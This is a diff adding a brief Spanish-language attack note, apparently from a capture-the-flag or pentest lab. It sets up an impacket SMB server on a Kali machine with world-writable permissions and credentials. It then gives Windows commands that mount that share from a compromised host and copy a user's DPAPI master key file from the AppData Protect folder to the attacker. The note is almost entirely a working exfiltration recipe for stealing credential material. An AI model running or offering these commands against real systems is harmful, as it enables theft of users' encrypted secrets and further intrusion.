@@ -1,0 +1,13 @@
+activar seguro smb kali
+┌──(root㉿kali)-[/home/kali]
+└─# mkdir -p /home/kali/share
+chmod 777 /home/kali/share
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-smbserver share /home/kali/share -smb2support -username user -password pass
+
+
+y del evil conectar seguro
+net use Z: \\10.10.16.46\share /user:user pass
+copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" Z:\masterkey_bl
+asi es mas segurito
